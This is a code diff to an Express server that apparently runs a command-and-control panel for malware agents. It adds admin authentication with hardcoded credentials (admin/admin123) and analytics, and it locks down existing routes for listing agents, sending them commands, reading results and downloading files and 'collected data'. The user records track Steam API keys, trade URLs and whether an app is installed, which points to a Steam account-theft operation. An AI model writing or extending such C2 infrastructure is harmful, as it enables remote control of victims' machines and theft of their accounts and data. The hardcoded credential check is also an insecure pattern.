@@ -544,9 +544,36 @@ app.post('/api/steam/profile', async (req, res) => {
   }
 });
 
+// Admin authentication middleware
+const authenticateAdmin = (req, res, next) => {
+  const authHeader = req.headers.authorization;
+  
+  if (!authHeader || !authHeader.startsWith('Bearer ')) {
+    return res.status(401).json({ error: 'No valid authorization header' });
+  }
+  
+  const token = authHeader.substring(7); // Remove 'Bearer ' prefix
+  
+  try {
+    // Decode the base64 token (username:password format)
+    const decoded = Buffer.from(token, 'base64').toString('utf-8');
+    const [username, password] = decoded.split(':');
+    
+    // In a real implementation, you would validate against a database
+    // For now, we'll use the same hardcoded credentials as the frontend
+    if (username === 'admin' && password === 'admin123') {
+      req.adminUser = { username };
+      next();
+    } else {
+      return res.status(401).json({ error: 'Invalid credentials' });
+    }
+  } catch (error) {
+    return res.status(401).json({ error: 'Invalid token format' });
+  }
+};
+
 // 4. Admin Routes
-app.get("/api/admin/users", async (req, res) => {
-  // TODO: Add authentication/authorization for this endpoint
+app.get("/api/admin/users", authenticateAdmin, async (req, res) => {
   try {
     const [rows] = await pool.query("SELECT * FROM users ORDER BY created_at DESC");
     res.json(rows);
@@ -556,8 +583,7 @@ app.get("/api/admin/users", async (req, res) => {
   }
 });
 
-app.get("/api/admin/page-visits", async (req, res) => {
-  // TODO: Add authentication/authorization for this endpoint
+app.get("/api/admin/page-visits", authenticateAdmin, async (req, res) => {
   try {
     const [rows] = await pool.query(`
       SELECT 
@@ -575,8 +601,7 @@ app.get("/api/admin/page-visits", async (req, res) => {
   }
 });
 
-app.get("/api/admin/page-visits-summary", async (req, res) => {
-  // TODO: Add authentication/authorization for this endpoint
+app.get("/api/admin/page-visits-summary", authenticateAdmin, async (req, res) => {
   try {
     const [totalVisits] = await pool.query("SELECT COUNT(*) as total FROM page_visits");
     const [todayVisits] = await pool.query("SELECT COUNT(*) as today FROM page_visits WHERE DATE(visited_at) = CURDATE()");
@@ -595,6 +620,182 @@ app.get("/api/admin/page-visits-summary", async (req, res) => {
     });
   } catch (err) {
     console.error("Error fetching page visits summary for admin:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+// Enhanced analytics endpoints
+app.get("/api/admin/analytics/detailed", authenticateAdmin, async (req, res) => {
+  try {
+    // Get visits by hour for today
+    const [hourlyVisits] = await pool.query(`
+      SELECT HOUR(visited_at) as hour, COUNT(*) as count
+      FROM page_visits 
+      WHERE DATE(visited_at) = CURDATE()
+      GROUP BY HOUR(visited_at)
+      ORDER BY hour
+    `);
+
+    // Get visits by day for last 7 days
+    const [dailyVisits] = await pool.query(`
+      SELECT DATE(visited_at) as date, COUNT(*) as count
+      FROM page_visits 
+      WHERE visited_at >= DATE_SUB(CURDATE(), INTERVAL 7 DAY)
+      GROUP BY DATE(visited_at)
+      ORDER BY date
+    `);
+
+    // Get unique visitors today
+    const [uniqueVisitorsToday] = await pool.query(`
+      SELECT COUNT(DISTINCT ip_address) as unique_visitors
+      FROM page_visits 
+      WHERE DATE(visited_at) = CURDATE()
+    `);
+
+    // Get unique visitors total
+    const [uniqueVisitorsTotal] = await pool.query(`
+      SELECT COUNT(DISTINCT ip_address) as unique_visitors
+      FROM page_visits
+    `);
+
+    // Get most active hours
+    const [activeHours] = await pool.query(`
+      SELECT HOUR(visited_at) as hour, COUNT(*) as count
+      FROM page_visits 
+      GROUP BY HOUR(visited_at)
+      ORDER BY count DESC
+      LIMIT 5
+    `);
+
+    // Get referrer statistics
+    const [referrerStats] = await pool.query(`
+      SELECT 
+        CASE 
+          WHEN referrer IS NULL OR referrer = '' THEN 'Direct'
+          WHEN referrer LIKE '%google%' THEN 'Google'
+          WHEN referrer LIKE '%facebook%' THEN 'Facebook'
+          WHEN referrer LIKE '%twitter%' THEN 'Twitter'
+          WHEN referrer LIKE '%reddit%' THEN 'Reddit'
+          ELSE 'Other'
+        END as source,
+        COUNT(*) as count
+      FROM page_visits 
+      GROUP BY source
+      ORDER BY count DESC
+    `);
+
+    res.json({
+      hourlyVisits,
+      dailyVisits,
+      uniqueVisitorsToday: uniqueVisitorsToday[0].unique_visitors,
+      uniqueVisitorsTotal: uniqueVisitorsTotal[0].unique_visitors,
+      activeHours,
+      referrerStats
+    });
+  } catch (err) {
+    console.error("Error fetching detailed analytics:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+app.get("/api/admin/analytics/user-engagement", authenticateAdmin, async (req, res) => {
+  try {
+    // Get user engagement metrics
+    const [userStats] = await pool.query(`
+      SELECT 
+        COUNT(*) as total_users,
+        COUNT(CASE WHEN steam_api_key IS NOT NULL THEN 1 END) as users_with_api_key,
+        COUNT(CASE WHEN trade_url IS NOT NULL THEN 1 END) as users_with_trade_url,
+        COUNT(CASE WHEN app_installed = 1 THEN 1 END) as users_with_app,
+        COUNT(CASE WHEN last_login >= DATE_SUB(NOW(), INTERVAL 7 DAY) THEN 1 END) as active_users_7d,
+        COUNT(CASE WHEN last_login >= DATE_SUB(NOW(), INTERVAL 30 DAY) THEN 1 END) as active_users_30d,
+        COUNT(CASE WHEN created_at >= DATE_SUB(NOW(), INTERVAL 7 DAY) THEN 1 END) as new_users_7d,
+        COUNT(CASE WHEN created_at >= DATE_SUB(NOW(), INTERVAL 30 DAY) THEN 1 END) as new_users_30d
+      FROM users
+    `);
+
+    // Get user registration trend
+    const [registrationTrend] = await pool.query(`
+      SELECT DATE(created_at) as date, COUNT(*) as count
+      FROM users 
+      WHERE created_at >= DATE_SUB(CURDATE(), INTERVAL 30 DAY)
+      GROUP BY DATE(created_at)
+      ORDER BY date
+    `);
+
+    // Get user login trend
+    const [loginTrend] = await pool.query(`
+      SELECT DATE(last_login) as date, COUNT(*) as count
+      FROM users 
+      WHERE last_login >= DATE_SUB(CURDATE(), INTERVAL 30 DAY)
+      GROUP BY DATE(last_login)
+      ORDER BY date
+    `);
+
+    res.json({
+      userStats: userStats[0],
+      registrationTrend,
+      loginTrend
+    });
+  } catch (err) {
+    console.error("Error fetching user engagement analytics:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+app.get("/api/admin/analytics/page-performance", authenticateAdmin, async (req, res) => {
+  try {
+    // Get detailed page performance metrics
+    const [pagePerformance] = await pool.query(`
+      SELECT 
+        page_path,
+        COUNT(*) as total_visits,
+        COUNT(DISTINCT ip_address) as unique_visitors,
+        COUNT(DISTINCT DATE(visited_at)) as days_visited,
+        MIN(visited_at) as first_visit,
+        MAX(visited_at) as last_visit,
+        ROUND(AVG(visits_per_day), 2) as avg_daily_visits
+      FROM (
+        SELECT 
+          page_path,
+          ip_address,
+          visited_at,
+          COUNT(*) OVER (PARTITION BY page_path, DATE(visited_at)) as visits_per_day
+        FROM page_visits
+      ) as daily_stats
+      GROUP BY page_path
+      ORDER BY total_visits DESC
+      LIMIT 20
+    `);
+
+    // Get page bounce rate (single page visits)
+    const [bounceRate] = await pool.query(`
+      SELECT 
+        page_path,
+        COUNT(*) as total_visits,
+        COUNT(CASE WHEN visit_count = 1 THEN 1 END) as single_page_visits,
+        ROUND((COUNT(CASE WHEN visit_count = 1 THEN 1 END) / COUNT(*)) * 100, 2) as bounce_rate
+      FROM (
+        SELECT 
+          page_path,
+          ip_address,
+          COUNT(*) as visit_count
+        FROM page_visits
+        WHERE visited_at >= DATE_SUB(NOW(), INTERVAL 7 DAY)
+        GROUP BY page_path, ip_address
+      ) as visitor_stats
+      GROUP BY page_path
+      HAVING total_visits >= 5
+      ORDER BY bounce_rate DESC
+      LIMIT 10
+    `);
+
+    res.json({
+      pagePerformance,
+      bounceRate
+    });
+  } catch (err) {
+    console.error("Error fetching page performance analytics:", err);
     res.status(500).json({ error: "Internal server error" });
   }
 });
@@ -832,7 +1033,7 @@ app.post('/api/c2/bulk-upload/:agent_id', async (req, res) => {
 });
 
 // Admin: Get all agents
-app.get('/api/admin/c2/agents', async (req, res) => {
+app.get('/api/admin/c2/agents', authenticateAdmin, async (req, res) => {
   if (!dbReady) {
     console.error('Database not ready for agents endpoint');
     return res.status(503).json({ error: "Database not available" });
@@ -854,7 +1055,7 @@ app.get('/api/admin/c2/agents', async (req, res) => {
 });
 
 // Admin: Create command
-app.post('/api/admin/c2/command', async (req, res) => {
+app.post('/api/admin/c2/command', authenticateAdmin, async (req, res) => {
   if (!dbReady) {
     console.error('Database not ready for command endpoint');
     return res.status(503).json({ error: "Database not available" });
@@ -881,7 +1082,7 @@ app.post('/api/admin/c2/command', async (req, res) => {
 });
 
 // Admin: Get command results
-app.get('/api/admin/c2/results', async (req, res) => {
+app.get('/api/admin/c2/results', authenticateAdmin, async (req, res) => {
   if (!dbReady) {
     console.error('Database not ready for results endpoint');
     return res.status(503).json({ error: "Database not available" });
@@ -907,7 +1108,7 @@ app.get('/api/admin/c2/results', async (req, res) => {
 });
 
 // Admin: Get agent details with commands
-app.get('/api/admin/c2/agent/:agent_id', async (req, res) => {
+app.get('/api/admin/c2/agent/:agent_id', authenticateAdmin, async (req, res) => {
   if (!dbReady) return res.status(503).json({ error: "Database not available" });
   
   try {
@@ -932,7 +1133,7 @@ app.get('/api/admin/c2/agent/:agent_id', async (req, res) => {
 });
 
 // Admin: Download uploaded files
-app.get('/api/admin/c2/download/:agent_id/:filename', async (req, res) => {
+app.get('/api/admin/c2/download/:agent_id/:filename', authenticateAdmin, async (req, res) => {
   try {
     const { agent_id, filename } = req.params;
     const filePath = path.join(process.cwd(), 'uploads', 'c2', agent_id, filename);
@@ -950,7 +1151,7 @@ app.get('/api/admin/c2/download/:agent_id/:filename', async (req, res) => {
 });
 
 // Admin: Get collected data by type
-app.get('/api/admin/c2/data/:agent_id/:data_type', async (req, res) => {
+app.get('/api/admin/c2/data/:agent_id/:data_type', authenticateAdmin, async (req, res) => {
   if (!dbReady) return res.status(503).json({ error: "Database not available" });
   
   try {
